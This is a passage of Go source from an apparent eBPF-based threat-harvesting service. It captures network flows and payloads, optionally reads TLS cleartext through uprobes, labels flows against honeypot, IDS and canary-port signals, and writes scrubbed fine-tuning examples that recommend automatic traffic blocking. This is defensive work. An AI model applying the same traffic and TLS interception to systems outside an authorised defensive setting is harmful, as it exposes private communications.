// reconcileBpfAttachmentsLocked re-syncs TCX interfaces and TLS uprobes
// with the current config after the first attach (R4-A-M3): attach TCX
// on newly listed interfaces, detach from removed ones, and do the
// same for the TLS uprobe allowlist. The ringbuf reader is bound to
// the loaded objects, which persist across a reconcile, so it keeps
// flowing untouched. Any attach/detach failure is returned instead of
// nil so ApplyConfig can report it.
func (m *ThreatHarvesterManager) reconcileBpfAttachmentsLocked() error {
	var errs []error

	desiredIfs := m.resolveAttachInterfacesLocked()
	desiredSet := make(map[string]bool, len(desiredIfs))
	for _, ifName := range desiredIfs {
		desiredSet[ifName] = true
	}
	for ifName := range m.tcxLinks {
		if !desiredSet[ifName] {
			if err := m.detachTcxLocked(ifName); err != nil {
				errs = append(errs, err)
			}
		}
	}
	for _, ifName := range desiredIfs {
		if _, ok := m.tcxLinks[ifName]; !ok {
			if err := m.attachTcxLocked(ifName); err != nil {
				errs = append(errs, err)
			}
		}
	}

	desiredUprobes := make(map[string]bool)
	if m.cfg.EnableTlsUprobes {
		for _, candidate := range m.cfg.TlsUprobeAllowlist {
			desiredUprobes[candidate] = true
		}
	}
	for candidate := range m.uprobeLinks {
		if !desiredUprobes[candidate] {
			if err := m.detachTlsUprobeLocked(candidate); err != nil {
				errs = append(errs, err)
			}
		}
	}
	for candidate := range desiredUprobes {
		if _, ok := m.uprobeLinks[candidate]; !ok {
			if err := m.attachTlsUprobeLocked(candidate); err != nil {
				errs = append(errs, err)
			}
		}
	}

	return errors.Join(errs...)
}

func (m *ThreatHarvesterManager) syncOrAttachBpfLocked() error {
	if os.Geteuid() != 0 || (strings.TrimSpace(os.Getenv("AXONWALL_RUNTIME_MODE")) == "dev" && strings.TrimSpace(os.Getenv("AXONWALL_DEV_EBPF")) != "1") {
		return errHarvesterBpfUnavailable
	}

	if !m.bpfLoaded {
		var objs axebpf.ThreatHarvesterObjects
		if err := axebpf.LoadThreatHarvesterObjects(&objs, nil); err != nil {
			return fmt.Errorf("LoadThreatHarvesterObjects: %w", err)
		}
		m.objs = objs
		m.bpfLoaded = true

		// Attach sched_process_exec & sys_enter_memfd_create tracepoints
		if tpExec, err := link.Tracepoint("sched", "sched_process_exec", m.objs.TpHarvesterExec, nil); err == nil {
			m.links = append(m.links, tpExec)
			m.activeHooks = append(m.activeHooks, "tracepoint/sched/sched_process_exec")
		}
		if tpMemfd, err := link.Tracepoint("syscalls", "sys_enter_memfd_create", m.objs.TpHarvesterMemfd, nil); err == nil {
			m.links = append(m.links, tpMemfd)
			m.activeHooks = append(m.activeHooks, "tracepoint/syscalls/sys_enter_memfd_create")
		}

		// Attach TCX ingress + egress across active/watched interfaces
		for _, ifName := range m.resolveAttachInterfacesLocked() {
			// Initial-attach tolerance: a single bad interface
			// must not fail the whole harvester start (the
			// reconcile path below is strict instead).
			_ = m.attachTcxLocked(ifName)
		}

		// Guarded optional TLS uprobe attachment (only allowlisted binaries, never control-plane daemons)
		if m.cfg.EnableTlsUprobes {
			for _, candidate := range m.cfg.TlsUprobeAllowlist {
				_ = m.attachTlsUprobeLocked(candidate)
			}
		}

		rd, err := ringbuf.NewReader(m.objs.HarvesterEvents)
		if err != nil {
			m.detachBpfLocked()
			return fmt.Errorf("ringbuf.NewReader: %w", err)
		}
		m.ringReader = rd
		go m.consumeRingbufLoop(rd)
	} else {
		// R4-A-M3: the attach block used to run only on first
		// attach, so a later ApplyConfig/UpdateConfig that changed
		// the watched interfaces updated only the runtime map
		// while new interfaces were never harvested and old ones
		// never detached. Reconcile the live attachments with the
		// current config; failures are returned, not swallowed.
		if err := m.reconcileBpfAttachmentsLocked(); err != nil {
			return err
		}
	}

	// Update runtime config map
	zero := uint32(0)
	firehoseFlag := uint8(0)
	if m.cfg.CaptureMode == "firehose" || len(m.cfg.FirehoseInterfaces) > 0 {
		firehoseFlag = 1
	}
	dropTier1 := uint8(0)
	if m.backpressureActive.Load() {
		dropTier1 = 1
	}
	sampleMod := uint32(200)
	if m.cfg.BenignSampleRate > 0 {
		inv := int(math.Round(1.0 / m.cfg.BenignSampleRate))
		if inv < 1 {
			inv = 1
		}
		sampleMod = uint32(inv)
	}
	rtCfg := axebpf.ThreatHarvesterHarvesterRuntimeCfg{
		Enabled:               1,
		FirehoseMode:          firehoseFlag,
		DropTier1Backpressure: dropTier1,
		MaxFlowPayloadBytes:   uint32(m.cfg.MaxPayloadBytes),
		BenignSampleMod:       sampleMod,
	}
	if err := m.objs.HarvesterCfgMap.Put(&zero, &rtCfg); err != nil {
		return err
	}

	// Sync dark ports map. R4-A-M3: the insert error used to be
	// discarded (`_ = ...Put(...)`), so a failed canary-port insert
	// was invisible; it is now returned, and ports removed from the
	// config are deleted from the map instead of lingering.
	if m.objs.HarvesterDarkPorts == nil {
		return fmt.Errorf("harvester dark-port map is not loaded")
	}
	desiredPorts := make(map[uint16]bool, len(m.cfg.CanaryPorts))
	for _, port := range m.cfg.CanaryPorts {
		if port > 0 && port <= 65535 {
			p := uint16(port)
			desiredPorts[p] = true
			v := uint8(1)
			if err := m.objs.HarvesterDarkPorts.Put(&p, &v); err != nil {
				return fmt.Errorf("harvester dark-port map insert for port %d: %w", port, err)
			}
		}
	}
	var stalePorts []uint16
	it := m.objs.HarvesterDarkPorts.Iterate()
	var iterKey uint16
	var iterVal uint8
	for it.Next(&iterKey, &iterVal) {
		if !desiredPorts[iterKey] {
			stalePorts = append(stalePorts, iterKey)
		}
	}
	if err := it.Err(); err != nil {
		return fmt.Errorf("harvester dark-port map iterate: %w", err)
	}
	for _, p := range stalePorts {
		if err := m.objs.HarvesterDarkPorts.Delete(&p); err != nil {
			return fmt.Errorf("harvester dark-port map delete for port %d: %w", p, err)
		}
	}
	return nil
}

func (m *ThreatHarvesterManager) consumeRingbufLoop(rd *ringbuf.Reader) {
	evSize := binary.Size(axebpf.ThreatHarvesterHarvesterRingEvent{})
	for {
		rec, err := rd.Read()
		if err != nil {
			if errors.Is(err, ringbuf.ErrClosed) {
				return
			}
			continue
		}
		if len(rec.RawSample) < evSize {
			continue
		}
		var ev axebpf.ThreatHarvesterHarvesterRingEvent
		if err := binary.Read(bytes.NewReader(rec.RawSample), binary.LittleEndian, &ev); err != nil {
			continue
		}
		m.ingestRingEvent(&ev)
	}
}

func uint32ToIPv4(raw uint32) string {
	var b [4]byte
	binary.LittleEndian.PutUint32(b[:], raw)
	return net.IP(b[:]).String()
}

func (m *ThreatHarvesterManager) ingestRingEvent(ev *axebpf.ThreatHarvesterHarvesterRingEvent) {
	now := time.Now().UTC()
	comm := cBytesToString(ev.Comm[:])
	sni := cBytesToString(ev.Sni[:])

	m.pendingMu.Lock()
	defer m.pendingMu.Unlock()

	if len(m.pendingFlows) > maxPendingHarvesterFlows*9/10 {
		m.backpressureActive.Store(true)
		m.backpressureCooloff = now.Add(10 * time.Second)
	}

	if ev.EventType == harvesterEvtProcExec || ev.EventType == harvesterEvtProcMemfd {
		memfd := ev.EventType == harvesterEvtProcMemfd || (ev.AnomalyFlags&harvesterAnomMemfdProc) != 0
		m.recentProcCgs[ev.CgroupId] = procContextMeta{
			comm:      comm,
			pid:       ev.Pid,
			memfd:     memfd,
			updatedAt: now,
		}
		if len(m.recentProcCgs) > 4096 {
			for k, v := range m.recentProcCgs {
				if now.Sub(v.updatedAt) > 2*time.Minute {
					delete(m.recentProcCgs, k)
				}
			}
		}
		return
	}

	if len(m.pendingFlows) >= maxPendingHarvesterFlows {
		return
	}

	key := fmt.Sprintf("%d:%s:%d->%s:%d/%d", ev.SocketCookie, uint32ToIPv4(ev.SrcV4), ev.SrcPort, uint32ToIPv4(ev.DstV4), ev.DstPort, ev.Proto)
	rec, ok := m.pendingFlows[key]
	if !ok {
		rec = &pendingFlowRecord{
			key: axebpf.ThreatHarvesterHarvesterFlowKey{
				SrcV4:   ev.SrcV4,
				DstV4:   ev.DstV4,
				SrcPort: ev.SrcPort,
				DstPort: ev.DstPort,
				Proto:   ev.Proto,
				Family:  4,
			},
			firstSeen: now,
		}
		m.pendingFlows[key] = rec
	}
	rec.lastSeen = now
	rec.socketCookie = ev.SocketCookie
	if ev.CgroupId != 0 {
		rec.cgroupID = ev.CgroupId
	}
	if ctxMeta, exists := m.recentProcCgs[rec.cgroupID]; exists {
		if rec.procComm == "" {
			rec.procComm = ctxMeta.comm
			rec.procPid = ctxMeta.pid
		}
		if ctxMeta.memfd {
			rec.memfdExec = true
		}
	}
	if ev.PktCount > rec.pktCount {
		rec.pktCount = ev.PktCount
	}
	if ev.ByteCount > rec.byteCount {
		rec.byteCount = ev.ByteCount
	}
	rec.pktSizes = ev.PktSizes
	rec.iatUs = ev.IatUs
	if rec.ja4t == "" && (ev.TcpWindow > 0 || ev.TcpMss > 0) {
		rec.ja4t = fmt.Sprintf("%d_2-%d_w%d", ev.TcpWindow, ev.TcpMss, ev.TcpWscale)
	}
	if sni != "" && rec.sni == "" {
		rec.sni = sni
	}
	if (ev.AnomalyFlags & harvesterAnomDarkPort) != 0 {
		rec.darkPortHit = true
	}
	if (ev.AnomalyFlags & harvesterAnomWatchlistHit) != 0 {
		rec.watchlistHit = true
	}
	if (ev.AnomalyFlags & harvesterAnomDnsEntropy) != 0 {
		rec.dnsEntropyHigh = true
	}
	if (ev.AnomalyFlags & harvesterAnomFirehose) != 0 {
		rec.firehose = true
	}
	if ev.EventType == harvesterEvtTlsCleartext {
		rec.tlsCleartext = true
	}

	if ev.PayloadLen > 0 {
		plen := int(ev.PayloadLen)
		if plen > len(ev.Payload) {
			plen = len(ev.Payload)
		}
		rawSlice := string(ev.Payload[:plen])
		scrubbed, reds := ScrubThreatPayload(rawSlice)
		rec.redactions += reds
		if rec.payloadBuf.Len() < 4096 {
			rec.payloadBuf.WriteString(scrubbed)
		}
	}
}

func (m *ThreatHarvesterManager) correlationLoop() {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-m.stopCh:
			return
		case <-ticker.C:
			m.FlushReadyFlows(false)
		}
	}
}

// FlushReadyFlows correlates completed/expired pending flows against Gold and Silver
// on-box oracles and materializes dual-track episodes + quota enforcement.
//
// R4-A-L7: RecordEpisode failures are counted and surfaced (returned
// as the second value, logged with the first error, and accumulated in
// Stats.RecordFailures) instead of silently under-reporting `created`.
func (m *ThreatHarvesterManager) FlushReadyFlows(forceAll bool) (created, failed int) {
	m.mu.RLock()
	cfg := m.cfg
	m.mu.RUnlock()

	window := time.Duration(cfg.CorrelationWindowSec) * time.Second
	if window <= 0 {
		window = 45 * time.Second
	}

	now := time.Now().UTC()
	var ready []*pendingFlowRecord

	m.pendingMu.Lock()
	if m.backpressureActive.Load() && now.After(m.backpressureCooloff) {
		m.backpressureActive.Store(false)
	}
	for k, rec := range m.pendingFlows {
		if forceAll || now.Sub(rec.firstSeen) >= window || now.Sub(rec.lastSeen) >= 15*time.Second {
			ready = append(ready, rec)
			delete(m.pendingFlows, k)
		}
	}
	m.pendingMu.Unlock()

	if len(ready) == 0 {
		return 0, 0
	}

	eveAlerts := m.readRecentSuricataAlerts()
	xdpBlocked := make(map[string]bool)
	if m.ebpfMgr != nil {
		for _, blk := range m.ebpfMgr.GetDataplaneSnapshot(100).ActiveBlocks {
			xdpBlocked[blk.IP] = true
		}
	}
	honeypotSources := make(map[string]bool)
	if m.mcpMgr != nil {
		for _, lease := range m.mcpMgr.ListLeases() {
			if lease.Kind == "redirect" && lease.NormalizedTarget != "" {
				honeypotSources[lease.NormalizedTarget] = true
			}
		}
	}
	lsmPidHit := make(map[uint32]bool)
	if m.lsmMgr != nil {
		_, _, _, evs := m.lsmMgr.Snapshot()
		for _, le := range evs {
			if le.Blocked {
				lsmPidHit[le.PID] = true
			}
		}
	}
	soarBlocked := make(map[string]bool)
	if m.vigilanteMgr != nil {
		for _, rec := range m.vigilanteMgr.ListBlockedIPs() {
			soarBlocked[rec.IP] = true
		}
	}

	created = 0
	var firstErr error
	for idx, rec := range ready {
		srcIP := uint32ToIPv4(rec.key.SrcV4)
		dstIP := uint32ToIPv4(rec.key.DstV4)

		var oracles []string
		var mitre []string
		gold := false
		silver := false

		if rec.darkPortHit {
			gold = true
			oracles = append(oracles, "canary_dark_port")
			mitre = append(mitre, "T1046")
		}
		if honeypotSources[srcIP] {
			gold = true
			oracles = append(oracles, "mcp_dnat_honeypot")
			mitre = append(mitre, "T1190")
		}
		if lsmPidHit[rec.procPid] && rec.procPid > 0 {
			gold = true
			oracles = append(oracles, "lsm_guard_eperm")
			mitre = append(mitre, "T1014")
		}
		if rec.memfdExec {
			silver = true
			oracles = append(oracles, "ebpf_memfd_fileless")
			mitre = append(mitre, "T1620")
		}
		if sid, ok := eveAlerts[srcIP]; ok {
			silver = true
			oracles = append(oracles, "suricata_sid:"+sid)
			mitre = append(mitre, "T1190")
		}
		if xdpBlocked[srcIP] || soarBlocked[srcIP] {
			silver = true
			oracles = append(oracles, "xdp_soar_blocklist")
		}
		if rec.dnsEntropyHigh {
			silver = true
			oracles = append(oracles, "ebpf_dns_entropy")
			mitre = append(mitre, "T1071.004")
		}

		labelTier := "unlabeled_anomaly"
		score := 0.25
		if gold {
			labelTier = "gold_malicious"
			score = 0.98
		} else if silver {
			labelTier = "silver_malicious"
			score = 0.84
		} else if rec.firehose {
			labelTier = "benign_sampled"
			score = 0.05
			oracles = append(oracles, "firehose_capture")
		} else {
			// Stratified benign negative sampling check
			if cfg.BenignSampleRate <= 0 {
				continue
			}
			mod := int(math.Round(1.0 / cfg.BenignSampleRate))
			if mod < 1 {
				mod = 1
			}
			if (idx+int(rec.key.SrcPort)+int(rec.pktCount))%mod != 0 {
				continue
			}
			labelTier = "benign_sampled"
			score = 0.04
			oracles = append(oracles, "stratified_benign_negative")
		}

		ep := buildEpisodeFromFlow(rec, srcIP, dstIP, labelTier, score, oracles, mitre, cfg.PinGoldEpisodes)
		if err := m.RecordEpisode(ep); err != nil {
			failed++
			if firstErr == nil {
				firstErr = err
			}
		} else {
			created++
		}
	}
	if failed > 0 {
		m.recordFailures.Add(uint64(failed))
		log.Printf("[ThreatHarvester] FlushReadyFlows: %d of %d ready flows failed to record an episode (first error: %v); spool writes are failing, see Stats.RecordFailures", failed, len(ready), firstErr)
	}
	return created, failed
}

func protoNameFromNum(proto uint8) string {
	switch proto {
	case 6:
		return "TCP"
	case 17:
		return "UDP"
	case 1:
		return "ICMP"
	default:
		return fmt.Sprintf("PROTO_%d", proto)
	}
}

func formatSequencePreview(sizes []int16, iats []uint32) string {
	n := len(sizes)
	if n > 8 {
		n = 8
	}
	parts := make([]string, 0, n)
	for i := 0; i < n; i++ {
		if sizes[i] == 0 {
			continue
		}
		var iat uint32
		if i < len(iats) {
			iat = iats[i]
		}
		parts = append(parts, fmt.Sprintf("%+dB@%dus", sizes[i], iat))
	}
	return strings.Join(parts, ", ")
}

func buildEpisodeFromFlow(rec *pendingFlowRecord, srcIP, dstIP, labelTier string, score float64, oracles, mitre []string, pinGold bool) ThreatEpisode {
	id := fmt.Sprintf("ep-%d-%04x", rec.firstSeen.UnixNano()/1e6, (rec.key.SrcPort^rec.key.DstPort)&0xFFFF)
	pktSizes := rec.pktSizes[:]
	iats := rec.iatUs[:]
	durMs := rec.lastSeen.Sub(rec.firstSeen).Seconds() * 1000.0
	if durMs < 0.1 {
		durMs = 1.0
	}
	scrubbed, extraRed := ScrubThreatPayload(rec.payloadBuf.String())
	redactions := rec.redactions + extraRed

	var dsl strings.Builder
	fmt.Fprintf(&dsl, "[T+0.000s] WIRE_FLOW src=%s:%d -> dst=%s:%d proto=%s cookie=0x%x ja4t=%s",
		srcIP, rec.key.SrcPort, dstIP, rec.key.DstPort, protoNameFromNum(rec.key.Proto), rec.socketCookie, rec.ja4t)
	if rec.sni != "" {
		fmt.Fprintf(&dsl, " sni=%s", rec.sni)
	}
	dsl.WriteByte('\n')
	if seq := formatSequencePreview(pktSizes, iats); seq != "" {
		fmt.Fprintf(&dsl, "[T+0.004s] PKT_SEQ[%s] pkts=%d bytes=%d\n", seq, rec.pktCount, rec.byteCount)
	}
	if rec.procComm != "" || rec.cgroupID != 0 {
		fmt.Fprintf(&dsl, "[T+0.012s] HOST_PROC comm=%q pid=%d cgroup_id=%d memfd=%v\n",
			rec.procComm, rec.procPid, rec.cgroupID, rec.memfdExec)
	}
	if scrubbed != "" {
		preview := scrubbed
		if len(preview) > 512 {
			preview = preview[:512] + "..."
		}
		fmt.Fprintf(&dsl, "[T+0.025s] L7_SCRUBBED(%d_redactions) %q\n", redactions, preview)
	}
	if len(oracles) > 0 {
		fmt.Fprintf(&dsl, "[T+0.045s] ORACLE_VERDICT tier=%s score=%.2f sources=[%s]\n",
			labelTier, score, strings.Join(oracles, ","))
	}

	toolCall := ""
	reasoning := ""
	if labelTier == "gold_malicious" || labelTier == "silver_malicious" {
		mitreTag := "T1190"
		if len(mitre) > 0 {
			mitreTag = mitre[0]
		}
		toolCall = fmt.Sprintf(`blackhole_traffic({"target":%q,"mode":"nft_drop","direction":"inbound","ttlSeconds":3600,"reason":"Autonomous Blackbox threat correlation (%s)"})`, srcIP, mitreTag)
		reasoning = fmt.Sprintf("Flow from %s targeting %s:%d triggered %s (%s). Coordinated wire timing + host lineage confirms threat posture; recommend immediate TTL-bounded NFT/XDP containment.",
			srcIP, dstIP, rec.key.DstPort, strings.Join(oracles, " + "), mitreTag)
	} else {
		toolCall = "none (benign baseline verified)"
		reasoning = "Normal protocol handshake and benign packet inter-arrival distribution with zero honeypot, LSM, or IDS oracle triggers."
	}

	reviewStatus := "pending"
	pinned := false
	if labelTier == "gold_malicious" && pinGold {
		pinned = true
		reviewStatus = "pinned_gold"
	}

	return ThreatEpisode{
		ID:                 id,
		CreatedAt:          rec.firstSeen.Format(time.RFC3339),
		TimestampUnixMs:    rec.firstSeen.UnixMilli(),
		LabelTier:          labelTier,
		ReviewStatus:       reviewStatus,
		Pinned:             pinned,
		VerdictScore:       score,
		OracleSources:      oracles,
		MitreAttack:        mitre,
		SrcIP:              srcIP,
		DstIP:              dstIP,
		SrcPort:            rec.key.SrcPort,
		DstPort:            rec.key.DstPort,
		Proto:              rec.key.Proto,
		ProtoName:          protoNameFromNum(rec.key.Proto),
		PktCount:           rec.pktCount,
		ByteCount:          rec.byteCount,
		DurationMs:         durMs,
		JA4T:               rec.ja4t,
		SNI:                rec.sni,
		CgroupID:           rec.cgroupID,
		ProcComm:           rec.procComm,
		ProcPid:            rec.procPid,
		MemfdExec:          rec.memfdExec,
		RedactionCount:     redactions,
		PktSizes:           pktSizes,
		IatUs:              iats,
		ScrubbedPayload:    scrubbed,
		CausalDsl:          strings.TrimSpace(dsl.String()),
		ReasoningTrace:     reasoning,
		RecommendedMcpTool: toolCall,
	}
}

func (m *ThreatHarvesterManager) readRecentSuricataAlerts() map[string]string {
	alerts := make(map[string]string)
	evePath := "/var/log/suricata/eve.json"
	if m.vigilanteMgr != nil && m.vigilanteMgr.telemetryLog != "" {
		evePath = m.vigilanteMgr.telemetryLog
	}
	f, err := os.Open(evePath)
	if err != nil {
		return alerts
	}
	defer f.Close()
	fi, err := f.Stat()
	if err == nil {
		curOffset := m.eveOffset.Load()
		if curOffset > fi.Size() {
			curOffset = 0
		}
		if curOffset == 0 && fi.Size() > 256*1024 {
			curOffset = fi.Size() - 256*1024
		}
		if _, err := f.Seek(curOffset, io.SeekStart); err == nil {
			sc := bufio.NewScanner(f)
			for sc.Scan() {
				var row struct {
					EventType string `json:"event_type"`
					SrcIP     string `json:"src_ip"`
					Alert     struct {
						SignatureID int `json:"signature_id"`
					} `json:"alert"`
				}
				if err := json.Unmarshal(sc.Bytes(), &row); err == nil && row.EventType == "alert" && row.SrcIP != "" {
					alerts[row.SrcIP] = strconv.Itoa(row.Alert.SignatureID)
				}
			}
			if pos, err := f.Seek(0, io.SeekCurrent); err == nil {
				m.eveOffset.Store(pos)
			}
		}
	}
	return alerts
}

// RecordEpisode scrubs, writes compressed SFT JSONL + Parquet feature shards to disk,
// appends to index, and enforces spool quota while preserving pinned Gold episodes.
func (m *ThreatHarvesterManager) RecordEpisode(ep ThreatEpisode) error {
	// Ensure always-on redaction before writing a single byte to disk
	if ep.ScrubbedPayload != "" {
		cleaned, n := ScrubThreatPayload(ep.ScrubbedPayload)
		ep.ScrubbedPayload = cleaned
		ep.RedactionCount += n
	}
	if ep.CausalDsl != "" {
		cleanedDsl, n := ScrubThreatPayload(ep.CausalDsl)
		ep.CausalDsl = cleanedDsl
		ep.RedactionCount += n
	}
	if ep.ID == "" {
		ep.ID = fmt.Sprintf("ep-%d", time.Now().UnixNano())
	}
	if ep.CreatedAt == "" {
		ep.CreatedAt = time.Now().UTC().Format(time.RFC3339)
	}
	if ep.TimestampUnixMs == 0 {
		ep.TimestampUnixMs = time.Now().UTC().UnixMilli()
	}

	m.mu.Lock()
	defer m.mu.Unlock()

	epDir := filepath.Join(m.cfg.SpoolDir, "episodes")
	if err := os.MkdirAll(epDir, 0750); err != nil {
		return err
	}

	if err := m.writeEpisodeShardLocked(&ep); err != nil {
		return err
	}
	m.episodes = append(m.episodes, ep)
	if len(m.episodes) > maxInMemoryEpisodes {
		m.evictOldestUnpinnedCountLocked(len(m.episodes) - maxInMemoryEpisodes)
	}
	m.enforceSpoolQuotaLocked()
	return m.saveIndexLocked()
}

func (m *ThreatHarvesterManager) evictOldestUnpinnedCountLocked(toRemove int) {
	if toRemove <= 0 {
		return
	}
	kept := make([]ThreatEpisode, 0, len(m.episodes))
	removed := 0
	for _, ep := range m.episodes {
		if removed < toRemove && !ep.Pinned {
			_ = os.Remove(m.episodeZstPathLocked(ep.ID))
			_ = os.Remove(m.episodeParquetPathLocked(ep.ID))
			removed++
			continue
		}
		kept = append(kept, ep)
	}
	m.episodes = kept
}

// EnforceSpoolQuota removes oldest unpinned episodes whenever SpoolDir exceeds
// configured quota while preserving Pinned (Gold / human-reviewed) episodes.
func (m *ThreatHarvesterManager) EnforceSpoolQuota() int {
	m.mu.Lock()
	defer m.mu.Unlock()
	evicted := m.enforceSpoolQuotaLocked()
	if evicted > 0 {
		_ = m.saveIndexLocked()
	}
	return evicted
}

func (m *ThreatHarvesterManager) enforceSpoolQuotaLocked() int {
	limit := m.quotaLimitBytesLocked()
	if limit <= 0 {
		return 0
	}
	used := m.computeSpoolBytesLocked()
	if used <= limit {
		return 0
	}

	evicted := 0
	kept := make([]ThreatEpisode, 0, len(m.episodes))
	for _, ep := range m.episodes {
		if used > limit && !ep.Pinned {
			zPath := m.episodeZstPathLocked(ep.ID)
			pPath := m.episodeParquetPathLocked(ep.ID)
			if st, err := os.Stat(zPath); err == nil {
				used -= st.Size()
			}
			if st, err := os.Stat(pPath); err == nil {
				used -= st.Size()
			}
			_ = os.Remove(zPath)
			_ = os.Remove(pPath)
			evicted++
			continue
		}
		kept = append(kept, ep)
	}
	m.episodes = kept
	return evicted
}

type SftChatMessage struct {
	Role    string `json:"role"`
	Content string `json:"content"`
}

type SftTrainingExample struct {
	ID              string           `json:"id"`
	LabelTier       string           `json:"label_tier"`
	ReviewStatus    string           `json:"review_status"`
	SrcSubnetPrefix string           `json:"src_subnet_prefix"`
	OracleSources   []string         `json:"oracle_sources"`
	MitreAttack     []string         `json:"mitre_attack"`
	Messages        []SftChatMessage `json:"messages"`
}

func extractSubnetPrefix(ipStr string) string {
	ip := net.ParseIP(ipStr)
	if ip == nil {
		return "0.0.0.0/0"
	}
	if v4 := ip.To4(); v4 != nil {
		return fmt.Sprintf("%d.%d.%d.0/24", v4[0], v4[1], v4[2])
	}
	v6 := ip.To16()
	return net.IP(v6[:8]).String() + "::/64"
}

func (m *ThreatHarvesterManager) writeEpisodeShardLocked(ep *ThreatEpisode) error {
	epDir := filepath.Join(m.cfg.SpoolDir, "episodes")
	if err := os.MkdirAll(epDir, 0750); err != nil {
		return err
	}

	sftRec := episodeToSftExample(*ep, nil)
	sftJSON, err := json.Marshal(sftRec)
	if err != nil {
		return err
	}
	var zstBuf bytes.Buffer
	zw, err := zstd.NewWriter(&zstBuf)
	if err != nil {
		return err
	}
	_, _ = zw.Write(append(sftJSON, '\n'))
	if err := zw.Close(); err != nil {
		return err
	}
	if err := os.WriteFile(m.episodeZstPathLocked(ep.ID), zstBuf.Bytes(), 0640); err != nil {
		return err
	}

	var pqBuf bytes.Buffer
	row := episodeToParquetRow(*ep, nil)
	if err := WriteThreatFeatureParquet(&pqBuf, []ThreatParquetRow{row}); err != nil {
		return err
	}
	if err := os.WriteFile(m.episodeParquetPathLocked(ep.ID), pqBuf.Bytes(), 0640); err != nil {
		return err
	}

	ep.SpoolBytes = int64(zstBuf.Len() + pqBuf.Len())
	return nil
}

func episodeToSftExample(ep ThreatEpisode, anon *CryptoPanAnonymizer) SftTrainingExample {
	srcIP := ep.SrcIP
	dstIP := ep.DstIP
	sni := ep.SNI
	dsl := ep.CausalDsl
	tool := ep.RecommendedMcpTool
	reasoning := ep.ReasoningTrace
	if anon != nil {
		srcIP = anon.AnonymizeIP(srcIP)
		dstIP = anon.AnonymizeIP(dstIP)
		if sni != "" {
			rawSni := sni
			sni = anon.AnonymizeHostname(rawSni)
			dsl = strings.ReplaceAll(dsl, rawSni, sni)
			tool = strings.ReplaceAll(tool, rawSni, sni)
			reasoning = strings.ReplaceAll(reasoning, rawSni, sni)
		}
		dsl = anon.AnonymizeText(dsl)
		tool = anon.AnonymizeText(tool)
		reasoning = anon.AnonymizeText(reasoning)
	}
	assistant := fmt.Sprintf("<thinking>\n%s\n</thinking>\n\n<verdict>%s</verdict>\n<mitre>%s</mitre>\n<recommended_mcp_tool>%s</recommended_mcp_tool>",
		reasoning, ep.LabelTier, strings.Join(ep.MitreAttack, ","), tool)

	userContent := fmt.Sprintf("Analyze Axonwall Blackbox Telemetry Episode `%s` (%s:%d -> %s:%d, %s):\n\n%s",
		ep.ID, srcIP, ep.SrcPort, dstIP, ep.DstPort, ep.ProtoName, dsl)

	return SftTrainingExample{
		ID:              ep.ID,
		LabelTier:       ep.LabelTier,
		ReviewStatus:    ep.ReviewStatus,
		SrcSubnetPrefix: extractSubnetPrefix(srcIP),
		OracleSources:   ep.OracleSources,
		MitreAttack:     ep.MitreAttack,
		Messages: []SftChatMessage{
			{Role: "system", Content: harvesterDefaultSftSystem},
			{Role: "user", Content: userContent},
			{Role: "assistant", Content: assistant},
		},
	}
}

func episodeToParquetRow(ep ThreatEpisode, anon *CryptoPanAnonymizer) ThreatParquetRow {
	srcIP := ep.SrcIP
	dstIP := ep.DstIP
	sni := ep.SNI
	if anon != nil {
		srcIP = anon.AnonymizeIP(srcIP)
		dstIP = anon.AnonymizeIP(dstIP)
		if sni != "" {
			sni = anon.AnonymizeHostname(sni)
		}
	}
	return ThreatParquetRow{
		EpisodeID:       ep.ID,
		TimestampUnixMs: ep.TimestampUnixMs,
		SrcIP:           srcIP,
		DstIP:           dstIP,
		SrcPort:         int32(ep.SrcPort),
		DstPort:         int32(ep.DstPort),
		Proto:           int32(ep.Proto),
		PktCount:        int64(ep.PktCount),
		ByteCount:       int64(ep.ByteCount),
		DurationMs:      ep.DurationMs,
		DnsEntropy:      ep.DnsEntropy,
		JA4T:            ep.JA4T,
		SNI:             sni,
		PktSizes:        ep.PktSizes,
		IatUs:           ep.IatUs,
		LabelTier:       ep.LabelTier,
	}
}

func (m *ThreatHarvesterManager) ListEpisodes(tier, reviewStatus string, limit int) []ThreatEpisode {
	m.mu.RLock()
	defer m.mu.RUnlock()

	if limit <= 0 {
		limit = 100
	}
	out := make([]ThreatEpisode, 0, len(m.episodes))
	for i := len(m.episodes) - 1; i >= 0; i-- {
		ep := m.episodes[i]
		if tier != "" && tier != "all" && ep.LabelTier != tier {
			continue
		}
		if reviewStatus != "" && reviewStatus != "all" && ep.ReviewStatus != reviewStatus {
			continue
		}
		out = append(out, ep)
		if len(out) >= limit {
			break
		}
	}
	return out
}

func (m *ThreatHarvesterManager) ReviewEpisode(id, action string) (*ThreatEpisode, error) {
	// R4-A-L1: the id flows into shard paths (and os.Remove on the
	// delete action); reject anything that is not a server-generated
	// episode id before it ever reaches filepath.Join.
	if !validThreatEpisodeID(id) {
		return nil, fmt.Errorf("invalid episode id %q", id)
	}
	m.mu.Lock()
	defer m.mu.Unlock()

	for i := range m.episodes {
		if m.episodes[i].ID != id {
			continue
		}
		switch action {
		case "delete":
			_ = os.Remove(m.episodeZstPathLocked(id))
			_ = os.Remove(m.episodeParquetPathLocked(id))
			deleted := m.episodes[i]
			m.episodes = append(m.episodes[:i], m.episodes[i+1:]...)
			_ = m.saveIndexLocked()
			return &deleted, nil
		case "pinned_gold":
			m.episodes[i].Pinned = true
			m.episodes[i].LabelTier = "gold_malicious"
			m.episodes[i].ReviewStatus = "pinned_gold"
			m.episodes[i].VerdictScore = 1.0
		case "approved_malicious":
			m.episodes[i].Pinned = true
			m.episodes[i].ReviewStatus = "approved_malicious"
		case "marked_benign":
			m.episodes[i].Pinned = true
			m.episodes[i].LabelTier = "benign_sampled"
			m.episodes[i].ReviewStatus = "marked_benign"
			m.episodes[i].VerdictScore = 0.0
			m.episodes[i].RecommendedMcpTool = "none (operator marked benign false-positive)"
		default:
			return nil, fmt.Errorf("unsupported review action: %s", action)
		}
		_ = m.writeEpisodeShardLocked(&m.episodes[i])
		_ = m.saveIndexLocked()
		cp := m.episodes[i]
		return &cp, nil
	}
	return nil, fmt.Errorf("episode %s not found", id)
}

// AnnotateEpisodeWithTeacherLLM calls an OpenAI-compatible Teacher-LLM endpoint
// with strict hourly call-budget enforcement to refine Silver/ambiguous reasoning.
//
// R4-A-M7: the prompt is anonymized with the same Crypto-PAn anonymizer
// as the export path before anything leaves the box, unless the
// operator explicitly opted in to raw telemetry
// (TeacherLlm.AllowRawTelemetry) for a local/trusted teacher. The
